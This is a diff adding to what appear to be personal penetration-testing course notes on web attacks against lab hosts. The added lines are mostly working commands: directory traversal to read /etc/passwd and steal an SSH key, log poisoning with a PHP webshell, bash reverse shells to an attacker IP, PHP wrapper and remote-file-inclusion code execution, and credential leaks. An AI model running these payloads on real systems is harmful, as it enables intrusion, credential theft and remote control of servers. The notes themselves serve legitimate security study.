@@ -329,16 +329,42 @@
         - XSS stored in the WordPress DB. Login WP as admin, then click the visitor plugins
         
 9. Common Web Application attacks
-    - **Directory traversal**: access files outside of the web root by using relative paths
+    - **Directory traversal**: access files outside of the web root by using relative paths (gathering info like credentials or keys that lead to system access)  
+      - `ls ../`: root system
+      - `ls ../../`: backward to 2 previous directories 
       - absolute path: `cat /home/kali/etc/passwd`  
       - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
       - extra ../sequence: `cat ../../../../../../../../../../../etc/passwd`
+      - hovering the site and find "http://mountaindesserts.com/meteor/index.php?page=admin.php"  
       - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
         The output of /etc/passwd shows a user called "offsec"
-      - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
       - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
+      - `ssh -i dt_key -p 2222 offsec@mountaindesserts.com`: connect SSH from stolen private key
+      - `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`: URL encoding ../
     - File inclusion vulnerabilities
+      - **Local file inclusion (LFI)** allow us to “include” a file in the application’s running code
+        - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`: Log entry of Apache’s access.log. Response incude user agent info  
+        - `<?php echo system($_GET['cmd']); ?>`: modify user agent header to include PHP snippet
+        - `../../../../../../../../../var/log/apache2/access.log&cmd=ps`: execute the command. output to access.log
+        - `../../../../../../../../../var/log/apache2/access.log&cmd=la%20-la`: URL encoding to bypass the bad request error of space
+        - `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`: shell or `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`: bash reverse shell
+        - `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`: encode the special chr with URL encoding
+        - before we send the request, start Netcat listener on port 4444. it will receive the incoming reverse shell from the target system `nc -nvlp 4444`
+        - target run on "XAMPP", apache logs found in C:\xampp\apache\logs\
+      - **PHP wrappers** can be used to represent and access local or remote filesystems. Use this to bypass filters or obtain code execution via File Inclusion vulnerabilities.
+        - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`: “php://filter” to include unencoded admin.php
+        - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`: “php://filter” to include base64 encoded admin.php
+        - `echo <base64 encoded text> | base64 -d`: Decoding the base64 encoded content of admin.php. Decooded data contains MySQL credentials
+        - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`: Usage of the “data://” wrapper to execute ls
+        - `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` output: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+        - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`: bypass filter system command
+        - data:// will not work in a default PHP installation. To exploit it, the "allow_url_include" setting needs to be enabled
+      - **Remote file inclusion (RFI)** : include files from a remote system over HTTP or SMB.
+        - PHP webshell locates in kali "/usr/share/webshells/php/"
+        - remote file must access by target system. Use Python3 http.server to start a web server `/usr/share/webshells/php/$ python3 -m http.server 80` or GitHub accessible file
+        - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`: Exploiting RFI with a PHP backdoor and execution of ls
     - File upload vulnerabilities
+      - 
     - Command injection
 10. SQL injection attacks
 11. Phishing Basics
@@ -490,12 +516,39 @@
   `curl -s --path-as-is http://192.168.173.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  
 
 ### Introduction to Web Application Attacks  
-- 8.2.3 Directory Brute Force with Gobuster
-  `gobuster dir -u 192.168.173.16 -w /usr/share/wordlists/dirb/common.txt -t5 -b 301`: exclude bad status code 301 redirection to continue
-  `gobuster dir -u 192.168.173.52 -w /usr/share/wordlists/dirb/common.txt -t5`  
-- Security Testing with Burp Suite
-  `curl http://192.168.173.52/passwords.txt`: download password  
-  burp intruder on POST /login.php + position (password=admin)  
+- 8.2 web application assessment 
+  - directory brute force with GoBuster
+    `gobuster dir -u 192.168.173.16 -w /usr/share/wordlists/dirb/common.txt -t5 -b 301`: exclude bad status code 301 redirection to continue
+    `gobuster dir -u 192.168.173.52 -w /usr/share/wordlists/dirb/common.txt -t5`  
+  - Security Testing with Burp Suite
+    `curl http://192.168.173.52/passwords.txt`: download password  
+     burp intruder on POST /login.php + position (password=admin)
+- 8.3 Web application enumeration
+  - debug page content
+    `sudo nano etc/hosts`
+    192.168.173.16  offsecwp
+    Browse about us page http://offsecwp/?p=1 > burp suite check response content > search the flag OS{
+  - enumerate APIs
+    ```
+    nano pattern
+    {GOBUSTER}/v1
+    {GOBUSTER}/v2
+
+    gobuster dir -u http://192.168.173.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+    curl -i http://192.168.173.16:5002/users/v1
+    curl -i http://192.168.173.16:5002/books/v1
+    ```
+  - site-maps browsing (robots.txt, sitemap.xml)
+    `nikto -h http://192.168.173.52`  
+  - read http header via curl and decode base64 via [CyberChef](https://gchq.github.io/CyberChef/)
+    `curl -i http://192.168.173.52`
+  - find flag in html, css, js
+    burp suite http history + filter by search item 'flag' + browser console run function
+- 8.4 cross-site scripting
+  - ddd
+  - ddd
+  - ddd  
+    
 ### Password Attacks  
 - 16.1.1 SSH and RDP
   **SSH** guess password
